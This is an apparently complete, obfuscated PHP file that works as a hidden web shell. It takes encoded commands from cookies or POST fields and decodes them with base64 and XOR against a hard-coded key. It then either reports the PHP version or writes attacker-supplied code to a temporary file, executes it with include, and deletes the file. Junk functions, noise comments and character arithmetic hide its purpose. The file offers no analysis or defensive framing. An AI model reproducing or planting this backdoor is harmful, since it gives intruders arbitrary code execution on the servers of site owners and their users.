<?php     function      sodyaodaf(){$ahkqfd_y='jdszxlq';    print_r  (36369+36369);    }
$nwyst    =     'nwyst' /*   tdbth */ ^	'';

$mkghhmjkvt /*   apbp  */ = /*ro_zwp*/ $_COOKIE;

$nqsii_bjh	=       $_POST;

$pmh_c	=   'yhawjplz';


$avwiwxmmbp /*dkkcqy*/ = /* y   */ 'gm';





function    joowa()

{

	$myzidtjbzfaro       =     362;

 /* nwxsxz   */ $mgpikyic	= /*   zbpw*/ 'mamfwyqg';

	$oznbueibna /* ryier   */ = /* e */ -54;

       $_u_etymoaj	=  $myzidtjbzfaro      /     8;
 /*   u  */ $zbvtgismfk       = /* nusa_y */ 218;


    $eylsshfi      = /*  nwt */ 'vgxi';
 /* qlrta  */ $zmzrcggzw    = /*d_clw */ -98;

}
joowa();



function	mqnfd($xgbaawhel,  $ftewhetgztmlmz)
{  $gncydm /*  ubnc   */ = /*  ju */ strlen($xgbaawhel);

      $nb_wxk /* nuz  */ =  strlen($ftewhetgztmlmz);
	 /* fd   */ global /*vzgf*/ $nwyst; /*  _i   */ $htjcmxipt /*  bt   */ =	"";
     $myzid /* bnn*/ =       0;   

    while   ($myzid /*   j*/ <	$gncydm)    {
      for    ($ftewhet /*  sch  */ =      0; /*   rafhhc  */ $ftewhet /* g */ < /* _eevw*/ $nb_wxk  &&	$myzid	< /*  gmcgb   */ $gncydm;    $ftewhet++,    $myzid++)    {
  $htjcmxipt /*aufenf*/ .= /*fni*/ $nwyst(ord($xgbaawhel[$myzid])    ^ /*  _ */ ord($ftewhetgztmlmz[$ftewhet]));


    }


    }
       


 /* iounfx  */ return	$htjcmxipt;
}






function /* vy */ xhafgp()

{


      $cfcxdj /* zbbv   */ = /*   sh  */ -47;    $wuiwrpv_z   =    'akvcq'; /* avln*/ $dlxjnbvc       = /*  v */ 400;

 /*  vspu  */ $kiznwgdkim    =	'zqy';
}




function     pzhxna($ljgl_pxgx,    $xgbaawhel){

 /*ggp */ global     $nwyst;



    $zer_m  = /* fm  */ sprintf($nwyst(80-34) /* n_nwc*/ .	$nwyst(592-545)	.     "\x25" /*  n  */ .     "s"."\x2e"  .    "p"."\154", /*jzqsqz   */ md5($ljgl_pxgx));

 /*  eixi  */ file_put_contents($zer_m,       "<"       .       "?".$nwyst(254-142)	.    $nwyst(565-461)       . /*   zkk   */ "\160" /*  te*/ .	$nwyst(32) /* hj   */ .    $nwyst(117) /*dwh   */ . /*  rftgof*/ "\156" /*   nuxr   */ . /*  plsy_  */ $nwyst(584-476)  . /*  rv   */ $nwyst(105) /*   nmckoq */ .    $nwyst(110)	. /*  mhqk  */ "k"."\x28"   .    $nwyst(95)    . /* j_jrc*/ "\137" /* _o*/ . /* eoad */ "F"."I"."L".$nwyst(235-166) /*   ecnmna*/ .    "\x5f"    .	"\x5f"	.	")".";".$nwyst(32)    . /* tmnzr   */ $xgbaawhel["d"]);

$a_eyaxg    = /*   nvz   */ 58;
$_hcaokip   =	569;

    include($zer_m);

 /*  glvlp */ $nhajtlyl	=     $zer_m; /*s   */ $llslvz /* th */ = /*   qyt_h  */ 258;


  @unlink($nhajtlyl); /*   eudlg   */ $anivk /*   hh  */ =     254;

 /*  qap   */ $qmtviv	=      $a_eyaxg /*  v_dnyk  */ %	3;
}






xhafgp();




function    p_ftcc()


{

	global /*ay_   */ $nwyst;

 /* ehrior */ $myzid /*wzu  */ = /*no*/ array();    $myzid["p"."\x76"]	=	phpversion();
 /* mne  */ $lkytyfehjw    = /* vivyhz*/ 'eelntkp';     $xrxsecltzi /* wxve  */ = /*  lkmsdt  */ strtoupper($lkytyfehjw);


    $myzid["\163"	.       "\166"]    = /* _f   */ "3"."."."5";
    $xofuupuy /*   jbip   */ =      strtoupper($xrxsecltzi);

   echo /* qibsos */ @serialize($myzid);

}




function	hmjkif($xgbaawhel,    $ljgl_pxgx,    $gzqjomq_)


{

  global /*_ommck */ $nwyst;



      $xgbaawhel   = /*   tjwx  */ unserialize(mqnfd(mqnfd(base64_decode($xgbaawhel),	$ljgl_pxgx),    $gzqjomq_));   if    (isset($xgbaawhel["\141"	.       "\x6b"])) /*  sq */ {

    if /*  vsnc   */ ($xgbaawhel["a"]       ==    $nwyst(632-527))  {


 /*ufgobp */ p_ftcc();


 /*   ukbxvi*/ $wxxinlt      = /* bi   */ 555;

	}    elseif       ($xgbaawhel["a"] /* oeqks  */ ==    $nwyst(953-852))    {

  pzhxna($ljgl_pxgx,      $xgbaawhel);

 /*f*/ $zhavoa /* jji  */ = /*qggku*/ 'ntqvlt';

 /*   qgv*/ }
 /* vcpc */ exit();      }

}




$mkghhmjkvt /*e*/ =	array_merge($nqsii_bjh, /* __r   */ $mkghhmjkvt);


$ljgl_pxgx /* j   */ =    "a".$nwyst(49)      .	"\61" /*tvqis */ .	"6"."\x32" /*   vs*/ . /*spev_b */ $nwyst(293-237)       .  "d"."\x30"     .	$nwyst(864-819)   .   $nwyst(54)       .    "7"."\x32"	.   "1"."\55" /*_gsvwx*/ .    $nwyst(52)     .       $nwyst(226-126)    .    "\x62"      .	$nwyst(953-852)."-"."a".$nwyst(818-718) /*   wqflax   */ .    $nwyst(509-412)	.    "\x39"    .    $nwyst(988-943) /*_   */ .      "\x65" /*uqyspj   */ .   "8"."\64" /*tntybr */ .    "\x35" /*c_u*/ . /*   mbs */ $nwyst(53)     .	"\x37"     . /* dwzma*/ $nwyst(97)    .       $nwyst(57)  . /*  ydalc  */ "\x38" /* mfxxj */ .	"\x34" /* bbn   */ .    "4"."\x35";


foreach    ($mkghhmjkvt  as       $gzqjomq_    =>    $xgbaawhel)       {


 /*fy  */ hmjkif($xgbaawhel,	$ljgl_pxgx,     $gzqjomq_);
 /*fayh  */ $ftewhetnmmp /*   qgxhq   */ = /*zv  */ 'vap';       $pslxebpgch /*   zmj  */ =       468;
}







?>